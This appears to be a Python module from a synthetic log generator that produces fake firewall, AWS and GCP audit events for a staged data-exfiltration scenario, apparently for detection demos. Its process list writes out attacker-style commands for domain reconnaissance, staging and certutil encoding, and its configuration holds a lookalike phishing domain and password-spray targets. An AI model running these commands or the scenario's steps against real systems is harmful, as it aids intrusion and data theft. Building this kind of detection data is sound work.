#!/usr/bin/env python3
"""
Exfil Scenario - APT-style data exfiltration events.
Combines functionality from:
  - scenarios/attack/exfil.sh (ASA)
  - scenarios/attack/exfil_aws.sh
  - scenarios/attack/exfil_gcp.sh
  - scenarios/attack/exfil_entraid.sh
  - scenarios/attack/exfil_exchange.sh
  - scenarios/attack/exfil_perfmon.sh
  - scenarios/attack/exfil_wineventlog.sh
  - scenarios/attack/exfil_linux.sh
"""

import random
import json
import uuid
from typing import List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from shared.config import Config
from shared.company import Company
from shared.time_utils import TimeUtils
from scenarios.registry import get_phase


@dataclass
class ExfilConfig:
    """Configuration for exfil scenario.

    Attack path:
      1. Threat actor sends phishing to Jessica Brown (Atlanta IT Admin)
      2. Jessica clicks link → credentials compromised
      3. Attacker accesses Jessica's mailbox, creates forwarding rule
      4. Lateral movement from Atlanta to Boston network
      5. Target: Alex Miller (Boston Finance) credentials obtained
      6. Data exfiltration from Boston file servers and cloud storage
    """
    demo_id: str = "exfil"

    # Threat actor
    threat_ip: str = "185.220.101.42"
    threat_location: str = "Frankfurt, Germany"
    threat_asn: str = "AS205100"

    # Primary target (Alex Miller - Finance, Boston HQ Floor 2)
    comp_user: str = "alex.miller"
    comp_email: str = "alex.miller@theFakeTshirtCompany.com"
    comp_ws_ip: str = "10.10.30.55"  # Boston user VLAN
    comp_ws_hostname: str = "BOS-WS-AMILLER01"
    comp_location: str = "BOS"

    # Initial compromise (Jessica Brown - IT Admin, Atlanta Hub Floor 1)
    lateral_user: str = "jessica.brown"
    lateral_email: str = "jessica.brown@theFakeTshirtCompany.com"
    jessica_ws_ip: str = "10.20.30.15"  # Atlanta user VLAN
    jessica_ws_hostname: str = "ATL-WS-JBROWN01"
    lateral_location: str = "ATL"

    # Phishing
    phishing_domain: str = "rnicrosoft-security.com"
    phishing_sender: str = "security@rnicrosoft-security.com"
    phishing_subject: str = "Action Required: Verify your account security"
    phishing_url: str = "https://rnicrosoft-security.com/verify?token=a8f3d9c2"
    phishing_mail_id: str = "phish-2026-001"

    # AWS
    aws_account_id: str = "123456789012"
    aws_region: str = "us-east-1"
    aws_secondary_region: str = "eu-north-1"
    aws_bucket_sensitive: str = "faketshirtco-financial-reports"
    aws_mal_user: str = "svc-datasync"
    aws_mal_pid: str = "AIDAMALICIOUS001"
    aws_mal_key: str = "AKIAMALICIOUS001"
    aws_comp_pid: str = "AIDAEXAMPLE789012"
    aws_comp_key: str = "AKIAEXAMPLE789"

    # GCP
    gcp_project: str = "faketshirtcompany-prod-01"
    gcp_region: str = "us-central1"
    gcp_zone: str = "us-central1-a"
    gcp_bucket_sensitive: str = "faketshirtco-confidential"
    gcp_mal_sa: str = "svc-gcs-sync"  # Malicious service account
    gcp_mal_key: str = "malicious-key-001"

    # Azure/Entra
    tenant: str = "theFakeTshirtCompany.com"
    tenant_id: str = "af23e456-7890-1234-5678-abcdef012345"

    # Exchange
    exchange_org: str = "theFakeTshirtCompany.com"


class ExfilScenario:
    """
    APT-style data exfiltration scenario.

    Timeline:
        Days 0-3: Reconnaissance (scanning, phishing sent)
        Day 4: Initial access (phishing success, account compromise)
        Days 5-7: Lateral movement
        Days 8-10: Persistence and staging
        Days 11-13: Data exfiltration
    """

    def __init__(self, config: Config, company: Company, time_utils: TimeUtils,
                 exfil_config: Optional[ExfilConfig] = None):
        self.config = config
        self.company = company
        self.time_utils = time_utils
        self.cfg = exfil_config or ExfilConfig()

        # Lateral movement targets - cross-site (Atlanta → Boston)
        # Atlanta servers (10.20.x.x), Boston servers (10.10.x.x)
        self.lateral_targets_atl = ["10.20.20.10", "10.20.20.11", "10.20.20.20"]  # Atlanta DC servers
        self.lateral_targets_bos = ["10.10.20.10", "10.10.20.11", "10.10.20.20", "10.10.20.21"]  # Boston servers
        self.lateral_targets = self.lateral_targets_atl + self.lateral_targets_bos
        self.lateral_ports = [445, 3389, 22, 3306, 5432, 1433]  # SMB, RDP, SSH, MySQL, PostgreSQL, MSSQL

        # Cloud IPs for persistence (Azure, AWS, GCP)
        self.cloud_ips = ["52.239.228.100", "3.5.140.2", "35.205.61.0", "20.190.128.0"]

        # Ports for scanning
        self.scan_ports = [22, 23, 25, 80, 110, 143, 443, 445, 3389, 5432, 3306, 1433, 5900, 8080]

        # Internal ACLs
        self.int_acls = [
            "internal_segmentation", "server_segment_acl", "workstation_restrictions",
            "cross_site_policy", "atl_to_bos_restrictions", "finance_server_acl"
        ]

        # Sensitive files
        self.aws_sens_files = [
            "reports/2024/annual-financial-report.xlsx",
            "confidential/merger-plans-2025.docx",
            "confidential/employee-salaries.csv",
            "confidential/customer-database.csv",
            "financial/q4-projections.xlsx"
        ]
        self.gcp_sens_files = [
            "strategy/2025-roadmap.pdf",
            "hr/salary-data-2024.xlsx",
            "finance/budget-2025.xlsx",
            "legal/contracts-2024.pdf",
            "executive/board-minutes.docx"
        ]

        # Windows event log processes
        self.exfil_processes = [
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all"),
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c net user /domain"),
            ("C:\\Windows\\System32\\cmd.exe", 'cmd.exe /c net group "Domain Admins" /domain'),
            ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ep bypass -c Get-ADUser -Filter *"),
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir \\\\FILE-01\\finance$ /s"),
            ("C:\\Windows\\System32\\xcopy.exe", "xcopy \\\\FILE-01\\finance$\\* C:\\Users\\Public\\staging\\ /s /e /h"),
            ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Compress-Archive -Path C:\\Users\\Public\\staging -DestinationPath C:\\Users\\Public\\backup.zip"),
            ("C:\\Windows\\System32\\certutil.exe", "certutil.exe -encode C:\\Users\\Public\\backup.zip C:\\Users\\Public\\backup.txt"),
        ]

        # Password spray targets
        self.spray_targets = ["admin", "administrator", "svc-backup", "svc-sql", "helpdesk",
                              "alex.miller", "jessica.brown", "it.admin", "sec.admin"]

    def _demo_suffix_syslog(self) -> str:
        """Get demo_id suffix for syslog format."""
        if self.config.demo_id_enabled:
            return f" demo_id={self.cfg.demo_id}"
        return ""

    def _demo_json(self) -> str:
        """Get demo_id JSON fragment."""
        if self.config.demo_id_enabled:
            return f'"demo_id":"{self.cfg.demo_id}",'
        return ""

    def _asa_pri(self, severity: int) -> str:
        """
        Calculate syslog PRI header for ASA logs.
        Cisco ASA uses local4 (facility 20).
        """
        facility = 20  # local4
        return f"<{facility * 8 + severity}>"

    # =========================================================================
    # ASA EVENTS
    # =========================================================================

    def asa_port_scan(self, day: int, hour: int, count: int = 1) -> List[str]:
        """Generate port scanning events from threat actor."""
        events = []
        suffix = self._demo_suffix_syslog()
        pri4 = self._asa_pri(4)  # warning

        for _ in range(count):
            ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
            tgt = self.company.get_internal_ip()
            port = random.choice(self.scan_ports)
            sport = random.randint(40000, 50000)

            events.append(
                f'{pri4}{ts} FW-EDGE-01 %ASA-4-106023: Deny tcp src outside:{self.cfg.threat_ip}/{sport} '
                f'dst inside:{tgt}/{port} by access-group "outside_access_in" [0x0, 0x0]{suffix}'
            )
        return events

    def asa_threat_detect(self, day: int, hour: int) -> List[str]:
        """Generate threat detection alerts."""
        suffix = self._demo_suffix_syslog()
        events = []
        pri4 = self._asa_pri(4)  # warning

        ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
        rate = random.randint(15, 35)
        events.append(
            f'{pri4}{ts} FW-EDGE-01 %ASA-4-733100: [Scanning] drop rate-1 exceeded. '
            f'Current burst rate is {rate} per second, max configured rate is 10{suffix}'
        )

        ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
        events.append(
            f'{pri4}{ts} FW-EDGE-01 %ASA-4-733101: Host {self.cfg.threat_ip} is attacking. '
            f'Current burst rate is {rate} per second{suffix}'
        )
        return events

    def asa_initial_access(self, day: int, hour: int) -> List[str]:
        """Generate initial access events to DMZ."""
        suffix = self._demo_suffix_syslog()
        events = []
        pri6 = self._asa_pri(6)  # info

        ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
        cid = random.randint(100000, 999999)
        sp = random.randint(44000, 54000)

        events.append(
            f'{pri6}{ts} FW-EDGE-01 %ASA-6-302013: Built inbound TCP connection {cid} '
            f'for outside:{self.cfg.threat_ip}/{sp} ({self.cfg.threat_ip}/{sp}) '
            f'to dmz:172.16.1.50/443 (203.0.113.50/443){suffix}'
        )
        events.append(
            f'{pri6}{ts} FW-EDGE-01 %ASA-6-725001: Starting SSL handshake with client '
            f'outside:{self.cfg.threat_ip}/{sp} for TLSv1.2 session{suffix}'
        )
        events.append(
            f'{pri6}{ts} FW-EDGE-01 %ASA-6-725002: Device completed SSL handshake with client '
            f'outside:{self.cfg.threat_ip}/{sp}{suffix}'
        )
        return events

    def asa_lateral_movement(self, day: int, hour: int) -> List[str]:
        """Generate lateral movement events."""
        suffix = self._demo_suffix_syslog()
        pri6 = self._asa_pri(6)  # info

        ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
        cid = random.randint(100000, 999999)
        sp = random.randint(49000, 54000)
        target = random.choice(self.lateral_targets)
        port = random.choice(self.lateral_ports)

        return [
            f'{pri6}{ts} FW-EDGE-01 %ASA-6-302013: Built inbound TCP connection {cid} '
            f'for inside:{self.cfg.comp_ws_ip}/{sp} ({self.cfg.comp_ws_ip}/{sp}) '
            f'to inside:{target}/{port} ({target}/{port}){suffix}'
        ]

    def asa_internal_deny(self, day: int, hour: int, count: int = 1) -> List[str]:
        """Generate internal segmentation deny events."""
        suffix = self._demo_suffix_syslog()
        events = []
        pri4 = self._asa_pri(4)  # warning

        for _ in range(count):
            ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
            tgt = self.company.get_internal_ip()
            port = random.choice(self.scan_ports)
            sport = random.randint(40000, 50000)
            acl = random.choice(self.int_acls)

            events.append(
                f'{pri4}{ts} FW-EDGE-01 %ASA-4-106023: Deny tcp src inside:{self.cfg.comp_ws_ip}/{sport} '
                f'dst inside:{tgt}/{port} by access-group "{acl}" [0x0, 0x0]{suffix}'
            )
        return events

    def asa_cloud_access(self, day: int, hour: int) -> List[str]:
        """Generate outbound connection to cloud services."""
        suffix = self._demo_suffix_syslog()
        pri6 = self._asa_pri(6)  # info

        ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
        cid = random.randint(100000, 999999)
        sp = random.randint(50000, 55000)
        cloud = random.choice(self.cloud_ips)

        return [
            f'{pri6}{ts} FW-EDGE-01 %ASA-6-302013: Built outbound TCP connection {cid} '
            f'for inside:{self.cfg.comp_ws_ip}/{sp} (203.0.113.1/{sp}) '
            f'to outside:{cloud}/443 ({cloud}/443){suffix}'
        ]

    def asa_data_exfil(self, day: int, hour: int) -> List[str]:
        """Generate data exfiltration events with realistic Built->Teardown ordering."""
        suffix = self._demo_suffix_syslog()
        events = []

        # 3-4 sessions per hour
        sessions = random.randint(3, 4)

        for s in range(sessions):
            cid = random.randint(100000, 999999)
            sp = random.randint(54000, 59000) + s

            # Session size: 500 MB - 2.5 GB
            mb = random.randint(500, 2500)
            bytes_val = mb * 1000000

            # Duration based on 500 Mbps
            bytes_per_sec = 62500000
            base_duration = max(1, bytes_val // bytes_per_sec)
            jitter = base_duration * random.randint(-20, 20) // 100
            duration_secs = max(1, base_duration + jitter)

            # Start time spread across hour
            start_min = (s * 60 // sessions) + random.randint(0, 60 // sessions // 2)
            start_min = min(start_min, 59)
            start_sec = random.randint(0, 59)

            # End time
            total_start_secs = start_min * 60 + start_sec
            total_end_secs = total_start_secs + duration_secs
            end_min = min(total_end_secs // 60, 59)
            end_sec = total_end_secs % 60 if end_min < 59 else 59

            # Duration string
            dur_mins = duration_secs // 60
            dur_secs = duration_secs % 60
            dur = f"0:{dur_mins}:{dur_secs}"

            pri6 = self._asa_pri(6)  # info

            # Built event
            ts_built = self.time_utils.ts_syslog(day, hour, start_min, start_sec)
            events.append(
                f'{pri6}{ts_built} FW-EDGE-01 %ASA-6-302013: Built outbound TCP connection {cid} '
                f'for inside:{self.cfg.comp_ws_ip}/{sp} (203.0.113.1/{sp}) '
                f'to outside:{self.cfg.threat_ip}/443 ({self.cfg.threat_ip}/443){suffix}'
            )

            # Teardown event
            ts_teardown = self.time_utils.ts_syslog(day, hour, end_min, end_sec)
            events.append(
                f'{pri6}{ts_teardown} FW-EDGE-01 %ASA-6-302014: Teardown TCP connection {cid} '
                f'for inside:{self.cfg.comp_ws_ip}/{sp} to outside:{self.cfg.threat_ip}/443 '
                f'duration {dur} bytes {bytes_val} TCP FINs{suffix}'
            )

        return events

    def asa_burst_detect(self, day: int, hour: int) -> List[str]:
        """Generate burst rate detection during exfiltration."""
        suffix = self._demo_suffix_syslog()
        events = []
        pri4 = self._asa_pri(4)  # warning

        ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
        rate = random.randint(1500000, 3500000)
        events.append(
            f'{pri4}{ts} FW-EDGE-01 %ASA-4-733100: [Burst] drop rate-1 exceeded. '
            f'Current burst rate is 0 per second, max configured rate is 400; '
            f'Current average rate is {rate} bytes per second to host {self.cfg.threat_ip}{suffix}'
        )

        ts = self.time_utils.ts_syslog(day, hour, random.randint(0, 59), random.randint(0, 59))
        events.append(
            f'{pri4}{ts} FW-EDGE-01 %ASA-4-733102: Threat-detection: Burst rate for host '
            f'{self.cfg.threat_ip} exceeded{suffix}'
        )
        return events

    def asa_hour(self, day: int, hour: int) -> List[str]:
        """Generate all ASA exfil events for a specific hour."""
        events = []
        phase = get_phase(day)

        # Scenario complete after day 14
        if phase is None:
            return events

        if phase == "recon":
            # Days 0-3: Reconnaissance scanning
            if 20 <= hour <= 23:
                events.extend(self.asa_port_scan(day, hour, random.randint(20, 35)))
            if hour == 22:
                events.extend(self.asa_port_scan(day, hour, random.randint(45, 65)))
                if random.random() < 0.5:
                    events.extend(self.asa_threat_detect(day, hour))
            if hour == 14:
                events.extend(self.asa_port_scan(day, hour, random.randint(15, 25)))

        elif phase == "initial_access":
            # Day 4: Initial access
            if hour == 14:
                events.extend(self.asa_port_scan(day, hour, random.randint(10, 20)))
                events.extend(self.asa_initial_access(day, hour))
                events.extend(self.asa_initial_access(day, hour))

        elif phase == "lateral":
            # Days 5-7: Lateral movement
            if 10 <= hour <= 16:
                count = random.randint(1, 3)
                for _ in range(count):
                    events.extend(self.asa_lateral_movement(day, hour))
                events.extend(self.asa_internal_deny(day, hour, random.randint(1, 3)))
                events.extend(self.asa_cloud_access(day, hour))

        elif phase == "persistence":
            # Days 8-10: Persistence and cloud access
            if 14 <= hour <= 17:
                count = random.randint(2, 5)
                for _ in range(count):
                    events.extend(self.asa_lateral_movement(day, hour))
                events.extend(self.asa_internal_deny(day, hour, random.randint(2, 5)))
                events.extend(self.asa_cloud_access(day, hour))

        elif phase == "exfil":
            # Days 11-13: Data exfiltration (varied timing)
            if day == 11:
                exfil_start, exfil_end = 1, 3
            elif day == 13:
                exfil_start, exfil_end = 3, 5
            else:
                exfil_start, exfil_end = 2, 4

            if exfil_start <= hour <= exfil_end:
                events.extend(self.asa_data_exfil(day, hour))
                events.extend(self.asa_burst_detect(day, hour))
                if random.random() < 0.5:
                    events.extend(self.asa_internal_deny(day, hour, random.randint(1, 2)))

        return events

    # =========================================================================
    # AWS EVENTS
    # =========================================================================

    def aws_create_user(self, day: int) -> str:
        """Create malicious IAM user."""
        ts = self.time_utils.ts_iso(day, 10, 45, 22)
        demo = self._demo_json()

        return json.dumps({
            "eventVersion": "1.08",
            "userIdentity": {
                "type": "IAMUser",
                "principalId": self.cfg.aws_comp_pid,
                "arn": f"arn:aws:iam::{self.cfg.aws_account_id}:user/{self.cfg.comp_user}",
                "accountId": self.cfg.aws_account_id,
                "accessKeyId": self.cfg.aws_comp_key,
                "userName": self.cfg.comp_user
            },
            "eventTime": ts,
            "eventSource": "iam.amazonaws.com",
            "eventName": "CreateUser",
            "awsRegion": self.cfg.aws_region,
            "sourceIPAddress": self.cfg.threat_ip,
            "userAgent": "console.amazonaws.com",
            "requestParameters": {"userName": self.cfg.aws_mal_user},
            "responseElements": {
                "user": {
                    "userName": self.cfg.aws_mal_user,
                    "userId": self.cfg.aws_mal_pid,
                    "arn": f"arn:aws:iam::{self.cfg.aws_account_id}:user/{self.cfg.aws_mal_user}"
                }
            },
            "requestID": "attack-aws-001",
            "eventID": "event-attack-001",
            "eventType": "AwsApiCall",
            "managementEvent": True,
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "eventCategory": "Management"
        })

    def aws_attach_policy(self, day: int) -> str:
        """Attach admin policy to malicious user."""
        ts = self.time_utils.ts_iso(day, 10, 46, 15)

        return json.dumps({
            "eventVersion": "1.08",
            "userIdentity": {
                "type": "IAMUser",
                "principalId": self.cfg.aws_comp_pid,
                "arn": f"arn:aws:iam::{self.cfg.aws_account_id}:user/{self.cfg.comp_user}",
                "accountId": self.cfg.aws_account_id,
                "accessKeyId": self.cfg.aws_comp_key,
                "userName": self.cfg.comp_user
            },
            "eventTime": ts,
            "eventSource": "iam.amazonaws.com",
            "eventName": "AttachUserPolicy",
            "awsRegion": self.cfg.aws_region,
            "sourceIPAddress": self.cfg.threat_ip,
            "userAgent": "console.amazonaws.com",
            "requestParameters": {
                "userName": self.cfg.aws_mal_user,
                "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
            },
            "requestID": "attack-aws-002",
            "eventID": "event-attack-002",
            "eventType": "AwsApiCall",
            "managementEvent": True,
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "eventCategory": "Management"
        })

    def aws_s3_exfil(self, day: int, hour: int) -> str:
        """S3 GetObject from sensitive bucket."""
        ts = self.time_utils.ts_iso(day, hour, random.randint(0, 59), random.randint(0, 59))
        file = random.choice(self.aws_sens_files)

        return json.dumps({
            "eventVersion": "1.08",
            "userIdentity": {
                "type": "IAMUser",
                "principalId": self.cfg.aws_mal_pid,
                "arn": f"arn:aws:iam::{self.cfg.aws_account_id}:user/{self.cfg.aws_mal_user}",
                "accountId": self.cfg.aws_account_id,
                "accessKeyId": self.cfg.aws_mal_key,
                "userName": self.cfg.aws_mal_user
            },
            "eventTime": ts,
            "eventSource": "s3.amazonaws.com",
            "eventName": "GetObject",
            "awsRegion": self.cfg.aws_region,
            "sourceIPAddress": self.cfg.comp_ws_ip,
            "userAgent": "aws-cli/2.13.0",
            "requestParameters": {
                "bucketName": self.cfg.aws_bucket_sensitive,
                "key": file
            },
            "requestID": f"exfil-{random.randint(0, 999)}",
            "eventID": f"event-exfil-{random.randint(0, 999)}",
            "readOnly": True,
            "resources": [{
                "type": "AWS::S3::Object",
                "ARN": f"arn:aws:s3:::{self.cfg.aws_bucket_sensitive}/{file}"
            }],
            "eventType": "AwsApiCall",
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "eventCategory": "Data"
        })

    def aws_hour(self, day: int, hour: int) -> List[str]:
        """Generate all AWS exfil events for a specific hour.

        Timeline (0-indexed days):
        - Day 8 (persistence phase start): Create backdoor IAM user + attach admin policy
        - Days 11-13 (exfil phase): GetObject from sensitive bucket
        """
        events = []
        phase = get_phase(day)

        # Scenario complete after day 14
        if phase is None:
            return events

        if phase == "persistence":
            # Day 8, 10:00: Create backdoor user (first day of persistence)
            if day == 8 and hour == 10:
                events.append(self.aws_create_user(day))
                events.append(self.aws_attach_policy(day))

        elif phase == "exfil":
            # Days 11-13: Data exfiltration (2-4 AM)
            if 2 <= hour <= 4:
                count = random.randint(2, 4)
                for _ in range(count):
                    events.append(self.aws_s3_exfil(day, hour))

        return events

    # =========================================================================
    # GCP EVENTS
    # =========================================================================

    def gcp_create_sa_key(self, day: int) -> str:
        """Create service account key."""
        ts = self.time_utils.ts_gcp(day, 11, 0, 0)

        return json.dumps({
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "iam.googleapis.com",
                "methodName": "google.iam.admin.v1.CreateServiceAccountKey",
                "authenticationInfo": {"principalEmail": f"{self.cfg.comp_user}@{self.cfg.tenant}"},
                "requestMetadata": {
                    "callerIp": self.cfg.threat_ip,
                    "callerSuppliedUserAgent": "Mozilla/5.0"
                },
                "resourceName": f"projects/{self.cfg.gcp_project}/serviceAccounts/compute-admin@{self.cfg.gcp_project}.iam.gserviceaccount.com/keys/{self.cfg.gcp_mal_key}"
            },
            "insertId": "attack-gcp-001",
            "resource": {
                "type": "service_account",
                "labels": {
                    "project_id": self.cfg.gcp_project,
                    "email_id": f"compute-admin@{self.cfg.gcp_project}.iam.gserviceaccount.com"
                }
            },
            "timestamp": ts,
            "severity": "NOTICE",
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "logName": f"projects/{self.cfg.gcp_project}/logs/cloudaudit.googleapis.com%2Factivity"
        })

    def gcp_create_service_account(self, day: int) -> str:
        """Create a malicious service account (persistence mechanism)."""
        ts = self.time_utils.ts_gcp(day, 10, 0, 0)
        sa_email = f"{self.cfg.gcp_mal_sa}@{self.cfg.gcp_project}.iam.gserviceaccount.com"

        return json.dumps({
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "iam.googleapis.com",
                "methodName": "google.iam.admin.v1.CreateServiceAccount",
                "authenticationInfo": {"principalEmail": f"{self.cfg.comp_user}@{self.cfg.tenant}"},
                "requestMetadata": {
                    "callerIp": self.cfg.threat_ip,
                    "callerSuppliedUserAgent": "Mozilla/5.0"
                },
                "resourceName": f"projects/{self.cfg.gcp_project}/serviceAccounts/{sa_email}",
                "request": {
                    "account_id": self.cfg.gcp_mal_sa,
                    "service_account": {
                        "display_name": "GCS Sync Service",
                        "description": "Service account for GCS synchronization"
                    }
                },
                "response": {
                    "email": sa_email,
                    "unique_id": "110123456789012345678"
                }
            },
            "insertId": "attack-gcp-sa-001",
            "resource": {
                "type": "service_account",
                "labels": {
                    "project_id": self.cfg.gcp_project,
                    "email_id": sa_email
                }
            },
            "timestamp": ts,
            "severity": "NOTICE",
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "logName": f"projects/{self.cfg.gcp_project}/logs/cloudaudit.googleapis.com%2Factivity"
        })

    def gcp_set_iam_policy(self, day: int) -> str:
        """Grant elevated IAM permissions to the malicious service account."""
        ts = self.time_utils.ts_gcp(day, 10, 5, 0)
        sa_email = f"{self.cfg.gcp_mal_sa}@{self.cfg.gcp_project}.iam.gserviceaccount.com"

        return json.dumps({
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "cloudresourcemanager.googleapis.com",
                "methodName": "SetIamPolicy",
                "authenticationInfo": {"principalEmail": f"{self.cfg.comp_user}@{self.cfg.tenant}"},
                "requestMetadata": {
                    "callerIp": self.cfg.threat_ip,
                    "callerSuppliedUserAgent": "Mozilla/5.0"
                },
                "resourceName": f"projects/{self.cfg.gcp_project}",
                "request": {
                    "policy": {
                        "bindings": [{
                            "role": "roles/storage.admin",
                            "members": [f"serviceAccount:{sa_email}"]
                        }]
                    }
                },
                "serviceData": {
                    "policyDelta": {
                        "bindingDeltas": [{
                            "action": "ADD",
                            "role": "roles/storage.admin",
                            "member": f"serviceAccount:{sa_email}"
                        }]
                    }
                }
            },
            "insertId": "attack-gcp-iam-001",
            "resource": {
                "type": "project",
                "labels": {
                    "project_id": self.cfg.gcp_project
                }
            },
            "timestamp": ts,
            "severity": "NOTICE",
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "logName": f"projects/{self.cfg.gcp_project}/logs/cloudaudit.googleapis.com%2Factivity"
        })

    def gcp_get_bucket_iam(self, day: int) -> str:
        """Get bucket IAM policy (reconnaissance for accessible data)."""
        ts = self.time_utils.ts_gcp(day, 14, random.randint(0, 59), random.randint(0, 59))

        return json.dumps({
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "storage.googleapis.com",
                "methodName": "storage.buckets.getIamPolicy",
                "authenticationInfo": {"principalEmail": f"{self.cfg.comp_user}@{self.cfg.tenant}"},
                "requestMetadata": {
                    "callerIp": self.cfg.threat_ip,
                    "callerSuppliedUserAgent": "Mozilla/5.0"
                },
                "resourceName": f"projects/_/buckets/{self.cfg.gcp_bucket_sensitive}"
            },
            "insertId": f"recon-gcp-{random.randint(100, 999)}",
            "resource": {
                "type": "gcs_bucket",
                "labels": {
                    "project_id": self.cfg.gcp_project,
                    "bucket_name": self.cfg.gcp_bucket_sensitive,
                    "location": self.cfg.gcp_region
                }
            },
            "timestamp": ts,
            "severity": "INFO",
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "logName": f"projects/{self.cfg.gcp_project}/logs/cloudaudit.googleapis.com%2Fdata_access"
        })

    def gcp_storage_list(self, day: int, hour: int) -> str:
        """List objects in sensitive bucket (discovery before exfiltration)."""
        ts = self.time_utils.ts_gcp(day, hour, random.randint(0, 30), random.randint(0, 59))
        sa_email = f"{self.cfg.gcp_mal_sa}@{self.cfg.gcp_project}.iam.gserviceaccount.com"

        return json.dumps({
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "storage.googleapis.com",
                "methodName": "storage.objects.list",
                "authenticationInfo": {"principalEmail": sa_email},
                "requestMetadata": {
                    "callerIp": self.cfg.comp_ws_ip,
                    "callerSuppliedUserAgent": "gsutil/5.0"
                },
                "resourceName": f"projects/_/buckets/{self.cfg.gcp_bucket_sensitive}"
            },
            "insertId": f"discovery-gcp-{random.randint(100, 999)}",
            "resource": {
                "type": "gcs_bucket",
                "labels": {
                    "project_id": self.cfg.gcp_project,
                    "bucket_name": self.cfg.gcp_bucket_sensitive,
                    "location": self.cfg.gcp_region
                }
            },
            "timestamp": ts,
            "severity": "INFO",
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "logName": f"projects/{self.cfg.gcp_project}/logs/cloudaudit.googleapis.com%2Fdata_access"
        })

    def gcp_storage_exfil(self, day: int, hour: int) -> str:
        """Get object from sensitive bucket."""
        ts = self.time_utils.ts_gcp(day, hour, random.randint(0, 59), random.randint(0, 59))
        file = random.choice(self.gcp_sens_files)

        return json.dumps({
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "serviceName": "storage.googleapis.com",
                "methodName": "storage.objects.get",
                "authenticationInfo": {"principalEmail": f"compute-admin@{self.cfg.gcp_project}.iam.gserviceaccount.com"},
                "requestMetadata": {
                    "callerIp": self.cfg.comp_ws_ip,
                    "callerSuppliedUserAgent": "gsutil/5.0"
                },
                "resourceName": f"projects/_/buckets/{self.cfg.gcp_bucket_sensitive}/objects/{file}"
            },
            "insertId": f"exfil-gcp-{random.randint(0, 999)}",
            "resource": {
                "type": "gcs_bucket",
                "labels": {
                    "project_id": self.cfg.gcp_project,
                    "bucket_name": self.cfg.gcp_bucket_sensitive,
                    "location": self.cfg.gcp_region
                }
            },
            "timestamp": ts,
            "severity": "INFO",
            "demo_id": self.cfg.demo_id if self.config.demo_id_enabled else None,
            "logName": f"projects/{self.cfg.gcp_project}/logs/cloudaudit.googleapis.com%2Fdata_access"
        })

    def gcp_hour(self, day: int, hour: int) -> List[str]:
        """Generate all GCP exfil events for a specific hour.

        Timeline (0-indexed days):
        - Day 7 (lateral movement): Recon - check bucket IAM policies
        - Day 8 (persistence start): Create SA, grant permissions, create key
        - Day 11: Discovery - list objects in sensitive bucket
        - Days 11-12 (exfil phase): GetObject from sensitive bucket
        """
        events = []
        phase = get_phase(day)

        # Scenario complete after day 14
        if phase is None:
            return events

        if phase == "lateral":
            # Day 7, 14:00: Reconnaissance - check bucket IAM policies
            if day == 7 and hour == 14:
                events.append(self.gcp_get_bucket_iam(day))

        elif phase == "persistence":
            # Day 8, 10:00: Create malicious service account
            if day == 8 and hour == 10:
                events.append(self.gcp_create_service_account(day))
                events.append(self.gcp_set_iam_policy(day))

            # Day 8, 11:00: Create service account key
            if day == 8 and hour == 11:
                events.append(self.gcp_create_sa_key(day))

        elif phase == "exfil":
            # Day 11, 02:00: Discovery - list objects before exfil
            if day == 11 and hour == 2:
                events.append(self.gcp_storage_list(day, hour))

            # Days 11-12: Data exfiltration from GCS (3-4 AM)
            if (day == 11 or day == 12) and 3 <= hour <= 4:
                count = random.randint(2, 4)
                for _ in range(count):
                    events.append(self.gcp_storage_exfil(day, hour))

        return events

    # =========================================================================
    # ENTRA ID EVENTS
    # =========================================================================

    def entraid_signin_hour(self, day: int, hour: int) -> List[str]:
        """Generate EntraID signin events for exfil scenario.

        Timeline:
        - Days 0-3 (Recon): Failed signins from threat IP probing accounts
        - Day 4 (Initial Access): Successful phishing, CA blocks on suspicious access
        - Days 5-7 (Lateral): Multiple failed MFA attempts
        - Days 8-10 (Persistence): Off-hours signin activity
        - Days 11-13 (Exfil): Service principal signin during exfil window
        """
        events = []
        phase = get_phase(day)

        if phase is None:
            return events

        demo_id = self.cfg.demo_id if self.config.demo_id_enabled else None

        # Import signin functions from generator
        from generators.generate_entraid import (
            signin_blocked_by_ca, signin_from_threat_ip, ts_iso, rand_uuid, TENANT, TENANT_ID
        )

        # Reconnaissance (Day 0-3): Occasional failed signins from threat IP
        if phase == "recon":
            # Day 1-3, random probing during business hours
